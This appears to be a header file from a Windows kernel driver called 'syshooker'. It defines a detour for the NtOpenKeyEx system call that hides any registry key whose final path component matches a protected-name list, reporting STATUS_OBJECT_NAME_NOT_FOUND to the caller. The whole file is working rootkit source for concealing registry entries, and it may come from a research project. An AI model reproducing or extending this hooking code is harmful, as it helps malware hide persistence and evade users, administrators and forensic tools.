#pragma once
#include "Settings.h"

typedef NTSTATUS(*NtOpenKeyEx_t)(
	_Out_ PHANDLE pKeyHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ ULONG OpenOptions
);

static UNICODE_STRING StringNtOpenKeyEx = RTL_CONSTANT_STRING(L"NtOpenKeyEx");
static NtOpenKeyEx_t OriginalNtOpenKeyEx = NULL;

NTSTATUS DetourNtOpenKeyEx(
	_Out_ PHANDLE pKeyHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ ULONG OpenOptions)
{
	//kprintf("[+] syshooker: In Detoured NtOpenKeyEx, calling the original now...\n");
	
	if (ObjectAttributes &&
		ObjectAttributes->ObjectName &&
		ObjectAttributes->ObjectName->Buffer)
	{
		//kprintf("[+] syshooker: NtOpenKeyEx length: %d, name: %wZ\n", ObjectAttributes->ObjectName->Length, ObjectAttributes->ObjectName);

		PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
		if (ObjectName) {
			memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
			memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

			// find the last L'\\' in the ObjectName to extract the key from the full registry path
			wchar_t* LastBackslash = wcsrchr(ObjectName, L'\\');
 
			// if L'\\' was not found, pass the whole ObjectName to the matching function
			// otherwise pass the remaining string AFTER the last backslash
			// in other words - the extracted registry key
			if (matchSyshookerNames(LastBackslash == nullptr ? ObjectName : LastBackslash + 1, (Target)TARGET_REGISTRY)) {
				kprintf("[+] syshooker: NtOpenKeyEx: hiding %ws\n", ObjectName);
				ExFreePool(ObjectName);
				return STATUS_OBJECT_NAME_NOT_FOUND;
			}

			ExFreePool(ObjectName); // free the buffer
		}
		else kprintf("[-] syshooker: NtOpenKeyEx: failed to allocate buffer...\n");
	}
	return OriginalNtOpenKeyEx(pKeyHandle, DesiredAccess, ObjectAttributes, OpenOptions);
}